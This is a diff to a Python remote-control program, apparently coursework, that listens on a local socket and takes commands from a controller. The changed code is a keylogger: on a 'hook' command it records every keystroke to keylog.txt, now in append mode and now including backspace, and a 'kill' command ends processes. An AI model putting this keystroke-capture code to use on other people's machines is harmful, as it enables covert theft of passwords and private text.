@@ -6,7 +6,6 @@ import winreg
 import psutil
 import subprocess
 import pynput
-from pynput import keyboard
 
 HOST = "127.0.0.1"
 PORT = 65432
@@ -41,10 +40,12 @@ def on_press(key):
     try:
         f.write(str(key.char))
     except AttributeError:
-        if(key == keyboard.Key.space):
+        if(key == pynput.keyboard.Key.space):
             key = " "
-        if(key == keyboard.Key.enter):
+        if(key == pynput.keyboard.Key.enter):
             key = "<enter>\n"
+        if(key == pynput.keyboard.Key.backspace):
+            key = "<backspace>"
         f.write(str(key))
 
 
@@ -274,8 +275,7 @@ try:
                 conn.sendall(bytes("kill_fail", "utf8"))
 
         elif encodedData == "hook":
-            f = open("keylog.txt", "w", encoding="utf8")  # ghi đè lên hết
-            f.seek(0)
+            f = open("keylog.txt", "a", encoding="utf8")
             listener = pynput.keyboard.Listener(on_press=on_press)
             listener.start()
             # bắt đầu thread theo dõi
@@ -284,7 +284,6 @@ try:
             if data == "unhook":
                 listener.stop()
                 listener.join()
-                f.truncate()
                 f.close()
         elif encodedData == "printkey":
             continue
